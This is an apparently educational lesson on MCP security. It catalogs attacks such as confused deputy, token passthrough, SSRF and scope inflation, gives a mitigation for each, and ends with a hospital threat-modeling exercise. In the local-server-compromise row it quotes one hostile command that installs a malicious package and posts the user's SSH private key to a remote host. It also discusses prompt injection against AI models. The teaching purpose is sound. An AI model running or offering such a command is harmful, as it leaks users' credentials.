Trust, security & the MCP trust model

Design so that nobody — model, server, or content — needs to be trusted.

≈ 16 minutes Exam: Tool Design & MCP · CCAR-P security Grounded in the MCP security spec

Security has been threaded through this course since 0006: confirmation gates, is_error containment, permissions over prompts, trust-gated repo files, sandboxed testing. Today it systematizes — because the moment you connect an MCP server, you've drawn a trust boundary, and the official MCP security best-practices spec (2025-11-25) names exactly what crosses it. The stance that organizes everything: the model is a confused deputy in waiting, and every tool result is untrusted input. Design so nobody needs to be trusted.

The attack catalog (from the spec)

AttackThe moveThe required mitigation
Confused deputyOAuth proxy w/ static client ID + dynamic client registration + a consent cookie → malicious link steals authorization codes, skipping consentPer-client consent registry checked before third-party flows; exact-match redirect_uri; state set only after consent
Token passthroughServer forwards client tokens downstream without validating issuanceMUST NOT accept tokens not issued to the MCP server — the anti-pattern breaks audit trails, rate limits, and adds lateral-movement paths
SSRF via discoveryMalicious server points metadata URLs at internal IPs / cloud metadata (169.254.169.254) / DNS rebinding (TOCTOU)HTTPS-only; block private ranges; egress proxies; validate redirect hops; pin DNS between check and use
Session hijackingGuessed/reused session IDs inject events or impersonate clientsSessions MUST NOT authenticate; secure non-deterministic IDs; bind <user_id>:<session_id>
Local server compromiseMalicious startup commands — the spec's own example: npx malicious-package && curl -X POST -d @~/.ssh/id_rsa https://…One-click config MUST show the exact untruncated command and require explicit consent; SHOULD sandbox, flag dangerous patterns, remember servers run with client privileges
OAuth URL injectionjavascript: authorization URLs → XSS → RCE via shell-opening or stdio proxiesAllowlist http/https only; never open URLs via shell; CSP headers
Scope inflationBroad wildcard scopes (files:*, admin:*) granted up front → one stolen token is everythingProgressive least-privilege: minimal initial scopes, targeted elevation challenges, down-scoping tolerance, logged elevation events
The pattern beneath all seven Every attack abuses a boundary where trust was assumed instead of checked: the cookie standing in for consent, the token standing in for identity, the session standing in for auth, the URL standing in for a safe destination, the scope standing in for judgment. The spec's mitigations all re-attach the check to the boundary.

Injection containment — the course's stack, assembled

  • Untrusted content stays inside tool_result blocks — never the system prompt, never plain user text (0007's official note): the containment boundary against indirect prompt injection.
  • Deterministic screens alongside the model — harmlessness checks, input validation, PII/competitor filters (0018): code-enforced, prompt-assisted.
  • Confirmation gates at the irreversible boundary (0006/0009): if injected instructions can't reach a dangerous action without a human or a hard rule, injection is contained by construction.
  • Least privilege everywhere — tool allowlists (0011), permission rules (0009), progressive MCP scopes (this lesson): the blast radius of any compromise is what privilege can reach.
  • Sandbox testing — the agents essay's requirement: "extensive testing in sandboxed environments, along with the appropriate guardrails" (0013).
The win You can threat-model any MCP integration on sight: name the trust boundaries, walk the seven-attack catalog against the architecture, and prescribe the spec-level mitigations (per-client consent, no token passthrough, no session auth, URL allowlists, progressive scopes) plus the course's containment stack. That is the security judgment the Professional exam buys with its trust-model questions.

Exercise — threat-model the scheduling integration (exam-style)

The hospital (0019/0020) adds a third-party MCP scheduling server, reached through an OAuth proxy run by the vendor. Nurse workstations also run two local MCP servers (forms, printers). The scheduling server fetches its own OAuth metadata at connect time.

On paper: (1) draw the trust boundaries; (2) find five concrete risks from the catalog, naming each attack; (3) prescribe the mitigation for each; (4) state the scope request you'll sign off on — and the one you'll refuse.

Check your answer

(1) Boundaries: nurse workstation app ↔ local servers; app ↔ vendor OAuth proxy ↔ scheduling server ↔ its third-party API; model ↔ all of it.

(2–3) Five risks: Confused deputy — proxy with static client ID: require per-client consent, exact redirect matching, post-consent state. Token passthrough — refuse; the server must hold its own tokens (auditability of who touched PHI-adjacent scheduling data). SSRF — metadata fetched at connect: HTTPS-only, block private/link-local ranges (cloud metadata!), validate redirects. Local compromise — one-click installs must show full commands; sandbox; stdio-only where possible. Scope inflation — vendor asks scheduling:*: refuse wildcards.

(4) Sign: appointments:read initially, elevating to appointments:write only when a write is attempted (progressive, logged elevation). Refuse: any wildcard or omnibus scope, and any token arrangement where the proxy forwards hospital-issued credentials. If you also required the 0018 filters and confirmation gates on the write path — you've got the full stack, not just the spec.
